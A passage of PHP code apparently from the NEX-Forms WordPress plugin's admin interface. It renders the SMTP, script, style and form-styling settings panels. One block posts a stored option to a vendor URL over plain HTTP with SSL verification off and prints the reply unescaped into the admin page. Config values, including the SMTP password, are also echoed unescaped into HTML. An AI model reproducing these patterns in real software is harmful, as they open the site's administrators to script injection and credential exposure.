									<input class="form-control" type="text" name="mail_port" placeholder="likely to be 25, 465 or 587" value="'.$email_config['mail_port'].'"><br /><br />
									
									<br /><label>SMTP Secure</label><br />
									<label class="radio-inline" for="none">			<input type="radio" '.(($email_config['email_smtp_secure']=='0' || !$email_config['email_smtp_secure']) ? 	'checked="checked"' : '').' name="email_smtp_secure" value="0" id="none">None</label>
									<label class="radio-inline" for="ssl">			<input type="radio" '.(($email_config['email_smtp_secure']=='ssl') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="ssl" id="ssl">SSL</label>
									<label class="radio-inline" for="tls">			<input type="radio" '.(($email_config['email_smtp_secure']=='tls') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="tls" id="tls">TLS</label><br />
									
									<br /><label>SMTP Authentication</label><br />
									<label class="radio-inline" for="auth_yes">			<input type="radio" '.(($email_config['smtp_auth']=='1') ? 	'checked="checked"' : '').'  name="smtp_auth" value="1" 		id="auth_yes"		>Use Authentication</label>
									<label class="radio-inline" for="auth_no">			<input type="radio" '.(($email_config['smtp_auth']=='0') ? 	'checked="checked"' : '').'  name="smtp_auth" value="0" 		id="auth_no"		>No Authentication</label><br />
									
									
								</div>
							</div>
							
							
							<div class="row smtp_auth_settings" '.(($email_config['email_method']!='smtp' || $email_config['smtp_auth']!='1') ? 		'style="display:none;"' : '').' >
								<div class="col-sm-12">
									<label>Set user name</label><br />
									<input class="form-control" type="text" name="set_smtp_user" value="'.$email_config['set_smtp_user'].'">
									<label>Set Password</label><br />
									<input class="form-control" type="password" name="set_smtp_pass" value="'.$email_config['set_smtp_pass'].'">
								</div>
							</div>
							
							<div class="row">
								<div class="col-sm-6">
									<br /><br /><label>Send email as:</label><br />
									<label class="radio-inline" for="html">	<input type="radio" '.(($email_config['email_content']=='html' || !$email_config['email_content']) ? 	'checked="checked"' : '').' name="email_content" value="html" 	id="html"	>HTML</label>
									<label class="radio-inline" for="pt">	<input type="radio" '.(($email_config['email_content']=='pt') ? 	'checked="checked"' : '').' name="email_content" value="pt" 	id="pt"	>Plain Text</label>
									</div>
							</div>
							
							
							<div class="row">
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
							
							
							<div class="row">
								<div class="modal-footer">
									<div class="col-sm-8">
										<input class="form-control" name="test_email_address" value="" placeholder="Enter Email Address">
										</div>
									<div class="col-sm-4">
										<div class="btn btn-primary send_test_email full_width">Send test email</div>
									</div>
								</div>
							</div>
								
						</form>
					</div>
					<div role="tabpanel" class="tab-pane" id="view_script_config">
						
						
						<form name="script_config" id="script_config" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post">	
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-success" style="display:none;">JavascriptScript (JS) inclusion configuration saved <div class="close fa fa-close"></div></div>
								</div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-warning">NOTE! Excluding core javascript files is not recomended! Nex-Forms uses core javascript files found in this current version of your WordPress installtion using best practice <strong>wp_enqueue_script()</strong>!</div>
									<div class="alert alert-danger">NOTE! Excluding files here may result in plugin failure. Exclude files only if you know what you are doing or for trouble shooting purposes.</div>
									<label>WP Core javascript files included by NEX-Forms </label>
									<div class="checkbox"><label for="inc-jquery">	<input type="checkbox" '.(($script_config['inc-jquery']=='1') ? 	'checked="checked"' : '').' name="inc-jquery" value="1" 	id="inc-jquery"	>jQuery <em></em></label></div>
									<div class="checkbox"><label for="inc-jquery-ui-core">	<input type="checkbox" '.(($script_config['inc-jquery-ui-core']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-core" value="1" 	id="inc-jquery-ui-core"	>jQuery UI Core</label></div>
									<div class="checkbox"><label for="inc-jquery-ui-autocomplete">	<input type="checkbox" '.(($script_config['inc-jquery-ui-autocomplete']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-autocomplete" value="1" 	id="inc-jquery-ui-autocomplete"	>jQuery UI Autocomplete</label></div>
									<div class="checkbox"><label for="inc-jquery-ui-slider">	<input type="checkbox" '.(($script_config['inc-jquery-ui-slider']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-slider" value="1" 	id="inc-jquery-ui-slider"	>jQuery UI Slider</label></div>
									<div class="checkbox"><label for="jquery-form">	<input type="checkbox" '.(($script_config['inc-jquery-form']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-form" value="1" 	id="inc-jquery-form"	>jQuery Form</label></div>
									
									
									<br /><label>Plugin dependent javascript files included by NEX-Forms</label>
									<div class="checkbox"><label for="inc-bootstrap"><input type="checkbox" '.(($script_config['inc-bootstrap']=='1') ? 	'checked="checked"' : '').' name="inc-bootstrap" value="1" 	id="inc-bootstrap"	>Bootstrap <em>(exclude if your theme includes this already for trouble shooting)</em></label></div>
									<div class="checkbox"><label for="inc-onload"><input type="checkbox" '.(($script_config['inc-onload']=='1') ? 	'checked="checked"' : '').' name="inc-onload" value="1" 	id="inc-onload"	>Onload Functions <em>(this will break the plugin if excluded!)</em></label></div>
								</div>
							</div>
							
							<div class="row">
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
								
						</form>
					</div>
					
					
					
					<div role="tabpanel" class="tab-pane" id="view_style_config">
						<form name="style_config" id="style_config" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post">	
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-success" style="display:none;">Stylesheet (CSS) inclusion configuration saved <div class="close fa fa-close"></div></div>
								</div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-danger">NOTE! Excluding files here may result in forms not diplaying properly. Exclude files only if you know what you are doing or for trouble shooting purposes.</div>
									<label>WP Core stylesheets (CSS) included by NEX-Forms </label>
									<div class="checkbox"><label for="incstyle-jquery-ui">	<input type="checkbox" '.(($styles_config['incstyle-jquery']=='1') ? 	'checked="checked"' : '').' name="incstyle-jquery" value="1" 	id="incstyle-jquery"	>jQuery UI<em></em></label></div>
									
									
									<br /><label>Custom stylesheets (CSS) files included by NEX-Forms</label>
									<div class="checkbox"><label for="incstyle-bootstrap"><input type="checkbox" '.(($styles_config['incstyle-bootstrap']=='1') ? 	'checked="checked"' : '').' name="incstyle-bootstrap" value="1" 	id="incstyle-bootstrap"	>Bootstrap</label></div>
									<div class="checkbox"><label for="incstyle-font-awesome"><input type="checkbox" '.(($styles_config['incstyle-font-awesome']=='1') ? 	'checked="checked"' : '').' name="incstyle-font-awesome" value="1" 	id="incstyle-font-awesome"	>Font Awesome</label></div>
									<div class="checkbox"><label for="incstyle-custom"><input type="checkbox" '.(($styles_config['incstyle-custom']=='1') ? 	'checked="checked"' : '').' name="incstyle-custom" value="1" 	id="incstyle-custom"	>Custom CSS</label></div>
							
							
							
								</div>
							</div>
							
							<div class="row">
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
								
						</form>
					
					</div>
					<div role="tabpanel" class="tab-pane" id="view_other_config">
					
						<form name="other_config" id="other_config" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post">	
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-success" style="display:none;">Configuration saved <div class="close fa fa-close"></div></div>
								</div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<label>Enable admin Color Adapt</label><br />
									<div class="checkbox"><label  for="enable-color-adapt-1">			<input type="radio" '.(($other_config['enable-color-adapt']=='1' || !$other_config['enable-color-adapt']) ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="1" 		id="enable-color-adapt-1"		><strong>Yes</strong> <em>(NEX-Forms admin will adapt to the Wordpress color scheme)</em></label></div>
									<div class="checkbox"><label  for="enable-color-adapt-0">			<input type="radio" '.(($other_config['enable-color-adapt']=='0') ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="0" 		id="enable-color-adapt-0"		><strong>No()</strong> <em>(Use default NEX-Forms colors)</em></label></div>							
								</div>
							</div>
							
							<div class="row">
								<div class="col-sm-12">
									<br /><label>Trouble Shooting options</label><br />
									<div class="checkbox"><label  for="enable-print-scripts">			<input type="checkbox" '.(($other_config['enable-print-scripts']=='1') ? 	'checked="checked"' : '').'  name="enable-print-scripts" value="1" 		id="enable-print-scripts"		><strong>Use wp_print_scripts()</strong> <em>(in vary rare cases this causes problems when enabled)</em></label></div>
									<div class="checkbox"><label  for="enable-print-styles">			<input type="checkbox" '.(($other_config['enable-print-styles']=='1') ? 	'checked="checked"' : '').'  name="enable-print-styles" value="1" 		id="enable-print-styles"		><strong>Use wp_print_styles()</strong> <em>(in extreamly rare cases this causes problems when enabled)</em></label></div>							
								</div>
							</div>
							
							<div class="row">
								<div class="col-sm-12">
									<br /><label>Admin options</label><br />
									<div class="checkbox"><label  for="enable-tinymce">			<input type="checkbox" '.(($other_config['enable-tinymce']=='1') ? 	'checked="checked"' : '').'  name="enable-tinymce" value="1" 		id="enable-tinymce"	><strong>Enable TinyMCE button</strong> <em>(hide/show Nex-Forms button in page/post editor)</em></label></div>
									<div class="checkbox"><label  for="enable-widget">			<input type="checkbox" '.(($other_config['enable-widget']=='1') ? 	'checked="checked"' : '').'  name="enable-widget" value="1" 		id="enable-widget"	><strong>Enable Widget</strong> <em>(hide/show Nex-Forms in widgets)</em></label>	</div>						
								</div>
							</div>
							
							<div class="row">
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
								
						</form>
					
					</div>
				  </div>
				
				</div>
				
				';
				if(!get_option('nex-forms-other-config'))
		{
		add_option('nex-forms-other-config',array(
				'enable-print-scripts'=>'1',
				'enable-print-styles'=>'1',
				'enable-tinymce'=>'1',
				'enable-widget'=>'1',	
			));
		}
							  
							  $output .= '</div>
							 
							</div>
						  </div>
						</div>';
		
		
		
		
		
		//NEX CONTAINER
		$output .= '<div id="nex-forms"><div class="form_update_id hidden"></div>';
		
			
			
			
			
				$api_params = array( 'get_menu_code' => 1,'ins_data'=>get_option('7103891'),'paypal_in_use'=>( is_plugin_active( 'nex-forms-paypal-add-on/main.php' )) ? 1 : 0);
				$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
				$output .= $response['body'];
				
				
			$output .= '<div style="clear:both;"></div>';
			
			
			
			$output .= '<div class="row admin-layout alert-info">';
			
			
			
			$output .= '<div class="col-sm-12 admin-layout">';
				
				
				
				
				$output .= '<div class="colmask rightmenu forms-canvas">';
					$output .= NEXForms_admin::NEXForms_field_settings();
					$output .= '<div class="slide_in_styling_options slide_in_right"><h4 class="left_slide_heading">Overall Styling</h4>';
					$output .= '<a class="close_overall_styling close_slide_in_right new_form"><span class="fa fa-close"></span></a>';
						
					
						
					
					
						
						$output .= '<div role="tabpanel">

				  <!-- Nav tabs -->
				  <ul class="nav nav-tabs" role="tablist">
				  	<li role="presentation" class="active"><a href="#form" aria-controls="home" role="tab" data-toggle="tab">Form</a></li>
					<li role="presentation"><a href="#labels" aria-controls="home" role="tab" data-toggle="tab">Labels</a></li>
					<li role="presentation"><a href="#inputs" aria-controls="home" role="tab" data-toggle="tab">Inputs</a></li>
				  </ul>';
					$output .= '<div class="tab-content panel" id="field-settings-inner">';
					
					
					
					
					//TAB 1
					$output .= ' <div role="tabpanel" class="tab-pane active" id="form">';
						$output .= '<div class="col-xs-12 overall-setting">';
						$output .= '<label>Form Themes</label>';
							if ( is_plugin_active( 'nex-forms-themes-add-on/main.php' ) ) {
							$output .= '<div class="overall-form-settings">';
									$output .= '<div class="dropdown">
														  <button class="btn btn-sm btn-primary dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true">
															<span class="current_selected_theme">1 - Default (bootstrap)</span>
															<span class="caret"></span>
														  </button>
														  
														   <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1">';
														  
														  		$output .= '<li class="default"><a href="#">1 - Default (bootstrap)</a></li>';
																$output .= '<li class="black-tie"><a href="#">2 - black-tie</a></li>';
																$output .= '<li class="blitzer"><a href="#">3 - blitzer</a></li>';
																$output .= '<li class="cupertino"><a href="#">4 - cupertino</a></li>';
																$output .= '<li class="dark-hive"><a href="#">5 - dark-hive</a></li>';
																$output .= '<li class="dot-luv"><a href="#">6 - dot-luv</a></li>';
																$output .= '<li class="eggplant"><a href="#">7 - eggplant</a></li>';
																$output .= '<li class="excite-bike"><a href="#">8 - excite-bike</a></li>';
																$output .= '<li class="flick"><a href="#">9 - flick</a></li>';
																$output .= '<li class="hot-sneaks"><a href="#">10 - hot-sneaks</a></li>';
																$output .= '<li class="humanity"><a href="#">11 - humanity</a></li>';
																$output .= '<li class="le-frog"><a href="#">12 - le-frog</a></li>';
																$output .= '<li class="mint-choc"><a href="#">13 - mint-choc</a></li>';
																$output .= '<li class="overcast"><a href="#">14 - overcast</a></li>';
																$output .= '<li class="pepper-grinder"><a href="#">15 - pepper-grinder</a></li>';
																$output .= '<li class="redmond"><a href="#">16 - redmond</a></li>';
																$output .= '<li class="smoothness"><a href="#">17 - smoothness</a></li>';
																$output .= '<li class="south-street"><a href="#">18 - south-street</a></li>';
																$output .= '<li class="start"><a href="#">19 - start</a></li>';
																$output .= '<li class="sunny"><a href="#">20 - sunny</a></li>';
																$output .= '<li class="swanky-purse"><a href="#">21 - swanky-purse</a></li>';
																$output .= '<li class="trontastic"><a href="#">22 - trontastic</a></li>';
																$output .= '<li class="ui-darkness"><a href="#">23 - ui-darkness</a></li>';
																$output .= '<li class="ui-lightness"><a href="#">24 - ui-lightness</a></li>';
																$output .= '<li class="vader"><a href="#">25 - vader</a></li>';
														    
														  
															$output .= '
														  </ul>
														</div>';
									$output .= '</div>';
							}
						else
							{
							$output .= '<br /><a class="btn btn-success buy" href="http://codecanyon.net/item/form-themes-for-nexforms/10037800?ref=Basix">Buy Add-on</a>';	
							}
								$output .= '</div>';
						
						
						$output .= '<div class="col-xs-12 overall-setting">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Font</label>';
								$output .=	'<div class="google-fonts-dropdown-label input-group input-group-sm"><select name="fonts" class="sfm form-control"></select><span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span></div>';
							$output .= '</div>';
						$output .= '</div>';
						
						
						$output .= '<div class="col-sm-12 overall-setting">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Custom CSS</label>';
								$output .=	'<textarea name="set_custom_css" class="form-control" id="set_custom_css">/* Container (effect front-end only) */
#nex-forms #ui-nex-forms-container{
	
}
/* Form Element (effect front-end/preview only) */
#nex-forms form {
	
}
/* Form Field Container */
#nex-forms .form_field{
	
}
/* Form Field Label Container */
#nex-forms .form_field .label_container{
	
}
/* Form Field Label Element */
#nex-forms .form_field .label_container label{
	
}
/* Form Field Main Label */
#nex-forms .form_field .label_container label span.the_label{
	
}
/* Form Field Main Label */
#nex-forms .form_field .label_container label span.sub-text{
	
}											
/* 
Form Field Input Container 
Find input select etc inside here
*/
#nex-forms .form_field .input_container{
	
}
/* Form Field Help Block */
#nex-forms .form_field .help-block{
	
}
/**************************/
/* Add more custom styles */
/**************************/</textarea>';
							$output .= '</div>';
						$output .= '</div>';
						
						
						
						
						
						
						
					$output .= '</div>';
					
					/*$output .= ' <div role="tabpanel" class="tab-pane active" id="form">';
						$output .= '<div class="col-sm-12 overall-setting">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Add Wrapper</label>';
								$output .= '<div role="toolbar" class="btn-toolbar">
										  <div class="btn-group btn-group-xs  overall-wrapper">
											<button class="btn btn-default  add" type="button"><span class="glyphicon glyphicon-arrow-left"></span>&nbsp;&nbsp;Add</button>
											<button class="btn btn-default  remove" type="button"><span class="glyphicon glyphicon-arrow-up"></span>&nbsp;&nbsp;Remove</button>
										  </div>
										</div>';
							$output .= '</div>';
						$output .= '</div>';
					$output .= '</div>';*/
					
					
					//TAB 2
					$output .= '<div role="tabpanel" class="tab-pane" id="labels">';
					$output .= '<div class="col-xs-12 overall-setting">';
						$output .= '<div class="input_holder ">';
							$output .= '<label>Position</label>';
							$output .= '<div role="toolbar" class="btn-toolbar">
										  <div class="btn-group btn-group-xs  overall-show-label">
											<button class="btn btn-default  left" type="button"><span class="glyphicon glyphicon-arrow-left"></span>&nbsp;&nbsp;Left</button>
											<button class="btn btn-default  top" type="button"><span class="glyphicon glyphicon-arrow-up"></span>&nbsp;&nbsp;Top</button>
											<button class="btn btn-default  inside" type="button"><span class=" fa fa-compress"></span>&nbsp;&nbsp;Inside</button>
										  </div>
										</div>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="col-xs-12 overall-setting">';
						$output .= '<div class="input_holder ">';
							$output .= '<label>Text Alignment</label>';
							$output .= '<div role="toolbar" class="btn-toolbar">
										  <div class="btn-group btn-group-xs  overall-align-label">
											<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;&nbsp;Left</button>
											<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;&nbsp;Center</button>
											<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;&nbsp;Right</button>
										  </div>
										</div>';
						$output .= '</div>';
					$output .= '</div>';
				
					
					$output .= '<div class="col-xs-12 overall-setting">';
						$output .= '<div class="input_holder ">';
							$output .= '<label>Label Color</label>';
							$output .= '<div id="overall-label-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
											<span class="input-group-addon"><i></i></span>
											<input type="text" value="#000000" class="form-control" />
											<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
										</div>';
						$output .= '</div>';
					$output .= '</div>';
					
					
					$output .= '<div class="col-xs-12 overall-setting">';
					$output .= '<div class="input_holder ">';
						$output .= '<label>Size</label>';
						$output .= '<div role="toolbar" class="btn-toolbar">
									  <div class="btn-group btn-group-xs  overall-label-size">
										<button class="btn btn-default small" type="button">Small</button>
										<button class="btn btn-default  normal" type="button">Normal</button>
										<button class="btn btn-default  large" type="button">Large</button>
									  </div>
									</div>';
					$output .= '</div>';
				$output .= '</div>';


					$output .= '<div class="col-xs-12 overall-setting">';
								$output .= '<div class="input_holder ">';
									$output .= '<label> Color</label>';
									$output .= '<div id="overall-sub-label-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
													<span class="input-group-addon"><i></i></span>
													<input type="text" value="#000000" class="form-control" />
													<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
												</div>';
								$output .= '</div>';
							$output .= '</div>';
					
					$output .= '<div class="col-xs-12 overall-setting">';
						$output .= '<div class="input_holder ">';
							$output .= '<label>Show Sub-Labels</label>';
							$output .= '<div role="toolbar" class="btn-toolbar">
										  <div class="btn-group btn-group-xs show-sub-label">
											<button class="btn btn-default show_subs" type="button"><span class="glyphicon glyphicon-eye"></span>&nbsp;&nbsp;Yes</button>
											<button class="btn btn-default hide_subs" type="button"><span class="glyphicon glyphicon-eye-close"></span>&nbsp;&nbsp;No</button>
										  </div>
										</div>';
						$output .= '</div>';
					$output .= '</div>';
					
						
					

												$output .= '<div class="col-sm-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Label Widths</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group overall-label-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Input Widths</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group overall-input-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
					
						
						
				$output .= '</div>';
				
				
				//TAB 3
					$output .= ' <div role="tabpanel" class="tab-pane" id="inputs">';
						
											$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text Color</label>';
														$output .= '<div id="overall-input-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#000000" class="form-control" />
																		<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Color</label>';
														$output .= '<div id="overall-input-bg-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											
												$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Border Color</label>';
														$output .= '<div id="overall-input-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#DDDDDD" class="form-control" />
																		<span class="input-group-addon reset" data-default="#DDDDDD"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12">&nbsp;</div>';
												
												$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Corners</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  overall-input-corners">
																		<button class="btn btn-default square" type="button">Square</button>
																		<button class="btn btn-default btn-primary normal" type="button">Rounded</button>
																		<!--<button class="btn btn-default full_rounded" type="button">Fully rounded</button>-->
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder">';
														$output .= '<label>Input Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  overall-input-size">
																		<button class="btn btn-default normal" type="button">Normal</button>
																		<button class="btn btn-default large" type="button">Large</button>
																		<button class="btn btn-default x-large" type="button">X-Large</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';	
												
												$output .= '<div class="col-xs-12 overall-setting" style="z-index:10000 !important;">';
														$output .= '<div class="input_holder ">';											
															$output .= '<label>Overall Prefix Color</label><br />';
															$output .= '<div class="btn-group btn-group-xs ">
																		<button type="button"  data-toggle="dropdown" class="btn btn-default prefix-color-class colorpicker-element">
																		<i class="btn-default"></i>
																		</button>
																		<div class="btn-group btn-group-xs ">
																		<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																		Select Color
																		</button><ul class="dropdown-menu overall-prefix-color">
																			 <li><a href="#" class="nf-default" style="border:1px solid #ddd"></a></li>
																			  <li><a href="#" class="ui-state-default" style="border:1px solid #ddd; background:#eee;"></a></li>																			  	
																			  <li><a href="#" class="label-primary"></a></li>
																			  <li><a href="#" class="label-info"></a></li>
																			  <li><a href="#" class="label-success"></a></li>
																			  <li><a href="#" class="label-warning"></a></li>
																			  <li><a href="#" class="label-danger"></a></li>
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '<div class="col-xs-12 overall-setting" style="z-index:9999 !important;">';
														$output .= '<div class="input_holder ">';											
															$output .= '<label>Overall Posfix Color</label><br />';
															$output .= '<div class="btn-group btn-group-xs ">
																		<button type="button"  data-toggle="dropdown" class="btn btn-default prefix-color-class colorpicker-element">
																		<i class="btn-default"></i>
																		</button>
																		<div class="btn-group btn-group-xs ">
																		<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																		
																		Select Color
																		</button><ul class="dropdown-menu overall-postfix-color">
																			 <li><a href="#" class="nf-default" style="border:1px solid #ddd"></a></li>
																			  <li><a href="#" class="ui-state-default" style="border:1px solid #ddd; background:#eee;"></a></li>																			  	
																			  <li><a href="#" class="label-primary"></a></li>
																			  <li><a href="#" class="label-info"></a></li>
																			  <li><a href="#" class="label-success"></a></li>
																			  <li><a href="#" class="label-warning"></a></li>
																			  <li><a href="#" class="label-danger"></a></li>
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  overall-align-input">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;&nbsp;Left</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;&nbsp;Right</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;&nbsp;Center</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
										
										
										$output .= '<div class="col-sm-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Label Widths</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group overall-label-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 overall-setting">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Input Widths</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group overall-input-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
